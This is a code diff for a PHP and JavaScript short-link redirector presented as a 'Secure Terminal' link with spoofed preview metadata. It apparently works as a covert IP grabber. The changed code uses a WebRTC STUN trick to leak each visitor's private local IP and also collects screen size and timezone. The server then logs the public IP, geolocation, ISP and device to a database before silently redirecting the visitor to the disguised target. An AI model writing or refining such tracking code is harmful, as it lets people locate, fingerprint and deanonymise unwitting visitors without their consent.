@@ -50,7 +50,7 @@ function fetch_real_meta($url) {$title = "";
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL,$oembed_url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 1);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 2);
         $json = curl_exec($ch);
         curl_close($ch);
         
@@ -66,7 +66,7 @@ function fetch_real_meta($url) {$title = "";
         curl_setopt($ch, CURLOPT_URL,$url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 1);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 2);
         curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
         $html = curl_exec($ch);
         curl_close($ch);
@@ -150,7 +150,7 @@ function get_ip_details($ip) {
     return ['country' => 'Unknown', 'city' => 'Unknown', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'Unknown'];
 }
 
-// 1. معالجة التوجيه وتسجيل السجلات
+// 1. معالجة التوجيه
 $og_title = "Secure Terminal";
 $og_image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
 
@@ -165,15 +165,16 @@ if (isset($_GET['r'])) {
         $og_title =$link['meta_title'];
         $og_image =$link['meta_image'];
 
-        // استقبال البيانات المرسلة من المتصفح عبر طلب خلفي سريع (AJAX)
-        if (isset($_GET['ajax_log']) &&$_GET['ajax_log'] == '1') {
-            $public_ip = get_real_ip();$local_ip = $_GET['lip'] ?? 'Cellular / Direct';$port = $_SERVER['REMOTE_PORT'] ?? 'N/A';$geo = get_ip_details($public_ip);$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';$device = get_device_type($ua);$screen = $_GET['screen'] ?? 'N/A';$tz = $_GET['tz'] ?? 'N/A';$created_at = date('Y-m-d H:i:s');
+        $public_ip = get_real_ip();$local_ip = $_GET['lip'] ?? 'Cellular / Direct';$port = $_SERVER['REMOTE_PORT'] ?? 'N/A';$geo = get_ip_details($public_ip);$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';$device = get_device_type($ua);$screen = $_GET['screen'] ?? 'N/A';$tz = $_GET['tz'] ?? 'N/A';$created_at = date('Y-m-d H:i:s');
 
+        if (isset($_GET['screen'])) {
             try {
                 $logStmt =$db->prepare("INSERT INTO logs (code, public_ip, local_ip, port, country, city, lat, lon, isp, device_info, screen_res, timezone, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                 $logStmt->execute([$code, $public_ip,$local_ip, $port,$geo['country'], $geo['city'],$geo['lat'], $geo['lon'],$geo['isp'], $device,$screen, $tz,$created_at]);
             } catch (Exception $e) {}
-            exit('OK');
+
+            header("Location: " . $target);
+            exit();
         }
     } else {
         die("Link not found.");
@@ -280,48 +281,47 @@ if (!empty($filter_code)) {
         footer span { color: #38bdf8; font-weight: 600; }
     </style>
     <script>
-        // جمع البيانات محلياً وإرسالها في الخلفية دون تأخير التوجيه البرقي
+        function getLocalIP(callback) {
+            let ips = [];
+            let RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+            if (!RTCPeerConnection) { callback("Cellular / Direct"); return; }
+            let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+            pc.createDataChannel("");
+            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
+            
+            pc.onicecandidate = function(ice) {
+                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                let myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
+                if (myIP) {
+                    let ip = myIP[1];
+                    if (!ips.includes(ip)) {
+                        ips.push(ip);
+                        if (ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172.")) {
+                            callback(ip);
+                            pc.onicecandidate = null;
+                        }
+                    }
+                }
+            };
+            // تقليص المهلة إلى 50 ميلي ثانية فقط للحفاظ على السرعة مع ضمان جلب الـ IP المحلي إن وجد
+            setTimeout(() => { 
+                let validLocal = ips.find(ip => ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172."));
+                callback(validLocal || "Cellular / Direct"); 
+            }, 50);
+        }
+
         document.addEventListener("DOMContentLoaded", function() {
             const urlParams = new URLSearchParams(window.location.search);
             const redirectCode = urlParams.get('r');
-            
-            <?php if (isset($target) && isset($_GET['r'])): ?>
-            if (redirectCode) {
-                let localIp = "Cellular / Direct";
-                let screenRes = screen.width + "x" + screen.height;
-                let tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                
-                let RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
-                if (RTCPeerConnection) {
-                    try {
-                        let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
-                        pc.createDataChannel("");
-                        pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
-                        pc.onicecandidate = function(ice) {
-                            if (!ice || !ice.candidate || !ice.candidate.candidate) return;
-                            let myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
-                            if (myIP) {
-                                let ip = myIP[1];
-                                if (ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172.")) {
-                                    localIp = ip;
-                                }
-                            }
-                        };
-                    } catch (e) {}
-                }
+            const hasScreen = urlParams.has('screen');
 
-                // إرسال البيانات وسجل IP المحلي خلال 40 ملي ثانية ثم التوجيه الفوري نحو يوتيوب
-                setTimeout(function() {
-                    const logUrl = `/?r=${redirectCode}&ajax_log=1&lip=${encodeURIComponent(localIp)}&screen=${encodeURIComponent(screenRes)}&tz=${encodeURIComponent(tz)}`;
-                    if (navigator.sendBeacon) {
-                        navigator.sendBeacon(logUrl);
-                    } else {
-                        fetch(logUrl, { method: 'GET', keepalive: true });
-                    }
-                    window.location.replace("<?php echo $target; ?>");
-                }, 40);
+            if (redirectCode && !hasScreen) {
+                getLocalIP(function(localIp) {
+                    const screenRes = screen.width + "x" + screen.height;
+                    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                    window.location.href = `/?r=${redirectCode}&lip=${encodeURIComponent(localIp)}&screen=${encodeURIComponent(screenRes)}&tz=${encodeURIComponent(tz)}`;
+                });
             }
-            <?php endif; ?>
         });
 
         async function pasteClipboard(inputName) {
